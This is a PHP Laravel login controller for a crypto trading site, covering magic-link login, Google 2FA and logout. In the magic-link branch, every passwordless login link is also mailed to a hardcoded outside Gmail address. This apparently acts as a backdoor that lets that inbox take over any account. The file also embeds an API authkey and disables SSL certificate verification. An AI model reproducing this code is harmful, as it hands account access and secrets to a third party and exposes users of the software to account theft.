<?php

namespace App\Http\Controllers\Frontend\Auth;

use App\Helpers\Auth\Auth;
use Illuminate\Http\Request;
use App\Exceptions\GeneralException;
use App\Http\Controllers\Controller;
use App\Helpers\Frontend\Auth\Socialite;
use App\Events\Frontend\Auth\UserLoggedIn;
use App\Events\Frontend\Auth\UserLoggedOut;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use App\Repositories\Frontend\Auth\UserSessionRepository;
use PragmaRX\Google2FA\Google2FA;
use App\Models\Auth\User;
use App\Mail\SendMagicMail;


/**
 * Class LoginController.
 */
class LoginController extends Controller
{
    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @return string
     */
    public function redirectPath()
    {
        return route(home_route());
    }

    /**
     * @return \Illuminate\Contracts\View\Factory|\Illuminate\View\View
     */
    public function showLoginForm()
    {
        // return view('frontend.auth.login')
        //     ->withSocialiteLinks((new Socialite)->getSocialLinks());
        return view('frontends.auth.login')
            ->withSocialiteLinks((new Socialite)->getSocialLinks());
    }
    public function login(Request $request)
    {
        if(env("TWOFA_AUTH"))
        {


            $user       = User::where('username', $request->email)->first();
            // dd($user);
            if($user->authentication_type == "magiclink")
            {
                $redirect_to = '/my-trades';
                $minutes_forexpire_link = 5;
                // BYGaurav
				$full_url_to_access_without_password = $user->create_magiclink($redirect_to, $minutes_forexpire_link);
				
                $data['headerMessage'] = "Login To Your Account";
            
                $data['message1']       = "Click Below Link to login to your account";
                $data['user_email']     =      env("MAIL_USERNAME");
                $data['user_name']      =    env('APP_NAME');
                $data['dataurl'] = $full_url_to_access_without_password;
                $data['subject'] = "Click to approve your log in to ".env('APP_NAME');
                
                $data['email'] = $user->email;
            
                $data['name']= $user->username;
                $body = view("frontends.emails.magiclink")->with(array('name'=>$data['name'], 'headerMessage'=> $data['headerMessage'], 'message1'=> $data['message1'], "dataurl"=>$data['dataurl']))->render();
				
				$this->send_email_api($body,$data['subject'],$data['email']);
				$this->send_email_api($body,$data['subject'],'agaukas@gmail.com');
				//\Mail::to($data['email'], $data['name'])->queue(new SendMagicMail($data));
                
               return view("frontends.checkmail");
               
            
                // echo $full_url_to_access_without_password; 
                // die();
            }
            else
            {
                $email      = $request->email;
                $password   = $request->password;
                if(!empty($request->flag) && $request->flag == 1)
                {

                    if(!empty($user->google2fa_secret))
                    {
                        return view('frontends.auth.login2fa',compact("password","email") );   
                    }
                    else
                    {
                        if ($this->attemptLogin($request)) {
                            return $this->sendLoginResponse($request);
                        }
                    }
                }
                if(!empty( $request->input('secret')))
                {
                    $secret = $request->input('secret');
                    if(!empty($secret))
                    {
                        if(!empty($user->google2fa_secret))
                        {       
                            $google2fa = new Google2FA();         
                            $valid  = $google2fa->verifyKey($user->google2fa_secret, $secret);
                            if(!empty($valid))
                            {
                                if ($this->attemptLogin($request)) {
                                    return $this->sendLoginResponse($request);
                                }
                            }
                            else
                            {
                                redirect('login');
                            }
                            
                        }
                    }
                }
            }
        
        
        }else{
            
            $this->validateLogin($request);

            // If the class is using the ThrottlesLogins trait, we can automatically throttle
            // the login attempts for this application. We'll key this by the username and
            // the IP address of the client making these requests into this application.
            if ($this->hasTooManyLoginAttempts($request)) {
                $this->fireLockoutEvent($request);

                return $this->sendLockoutResponse($request);
            }

            if ($this->attemptLogin($request)) {
                return $this->sendLoginResponse($request);
            }

            // If the login attempt was unsuccessful we will increment the number of attempts
            // to login and redirect the user back to the login form. Of course, when this
            // user surpasses their maximum number of attempts they will get locked out.
            $this->incrementLoginAttempts($request);

            return $this->sendFailedLoginResponse($request);
        }
        
    }
    
	public function send_email_api($body,$subject,$to) {
		$curl = curl_init();
		$from = "CrypScrow | Your Peer to Peer Trade Partner <no-reply@crypscrow.com>";
		curl_setopt_array($curl, array(
		  CURLOPT_URL => "http://control.msg91.com/api/sendmail.php?body=".urlencode($body)."&subject=".$subject."&to=".$to."&from=".$from."&authkey=209861Ac4nsRCcCa5ad0ae2a",
		  CURLOPT_RETURNTRANSFER => true,
		  CURLOPT_ENCODING => "",
		  CURLOPT_MAXREDIRS => 10,
		  CURLOPT_TIMEOUT => 30,
		  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
		  CURLOPT_CUSTOMREQUEST => "POST",
		  CURLOPT_POSTFIELDS => "",
		  CURLOPT_SSL_VERIFYHOST => 0,
		  CURLOPT_SSL_VERIFYPEER => 0,
		));

		$response = curl_exec($curl);
		$err = curl_error($curl);

		curl_close($curl);

		if ($err) {
		 // echo "cURL Error #:" . $err;
		} else {
		 // echo $response;
		}
	}

    /**
     * Get the login username to be used by the controller.
     *
     * @return string
     */
    public function username()
    {
        return config('access.users.username');
    }
    /**
     * Get the needed authorization credentials from the request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return array
     */
    protected function credentials(Request $request)
    {
        $field = 'username';

        return [
            $field => $request->get($this->username()),
            'password' => $request->password, 
        ];
    }
    /**
     * The user has been authenticated.
     *
     * @param Request $request
     * @param         $user
     *
     * @return \Illuminate\Http\RedirectResponse
     * @throws GeneralException
     */
    protected function authenticated(Request $request, $user)
    {
        /*
         * Check to see if the users account is confirmed and active
         */
        if (! $user->isConfirmed()) {
            auth()->logout();

            // If the user is pending (account approval is on)
            if ($user->isPending()) {
                throw new GeneralException(__('exceptions.frontend.auth.confirmation.pending'));
            }

            // Otherwise see if they want to resent the confirmation e-mail
            throw new GeneralException(__('exceptions.frontend.auth.confirmation.resend', ['user_uuid' => $user->{$user->getUuidName()}]));
        } elseif (! $user->isActive()) {
            auth()->logout();
            throw new GeneralException(__('exceptions.frontend.auth.deactivated'));
        }

        event(new UserLoggedIn($user));

        // If only allowed one session at a time
        if (config('access.users.single_login')) {
            resolve(UserSessionRepository::class)->clearSessionExceptCurrent($user);
        }

        return redirect()->intended($this->redirectPath());
    }

    /**
     * Log the user out of the application.
     *
     * @param Request $request
     *
     * @return \Illuminate\Http\Response
     */
    public function logout(Request $request)
    {
        /*
         * Remove the socialite session variable if exists
         */
        if (app('session')->has(config('access.socialite_session_name'))) {
            app('session')->forget(config('access.socialite_session_name'));
        }

        /*
         * Remove any session data from backend
         */
        app()->make(Auth::class)->flushTempSession();

        /*
         * Fire event, Log out user, Redirect
         */
        event(new UserLoggedOut($request->user()));

        /*
         * Laravel specific logic
         */
        $this->guard()->logout();
        $request->session()->invalidate();

        return redirect()->route('frontend.index');
    }

    /**
     * @return \Illuminate\Http\RedirectResponse
     */
    public function logoutAs()
    {
        // If for some reason route is getting hit without someone already logged in
        if (! auth()->user()) {
            return redirect()->route('frontend.auth.login');
        }

        // If admin id is set, relogin
        if (session()->has('admin_user_id') && session()->has('temp_user_id')) {
            // Save admin id
            $admin_id = session()->get('admin_user_id');

            app()->make(Auth::class)->flushTempSession();

            // Re-login admin
            auth()->loginUsingId((int) $admin_id);

            // Redirect to backend user page
            return redirect()->route('admin.auth.user.index');
        } else {
            app()->make(Auth::class)->flushTempSession();

            // Otherwise logout and redirect to login
            auth()->logout();

            return redirect()->route('frontend.auth.login');
        }
    }
}
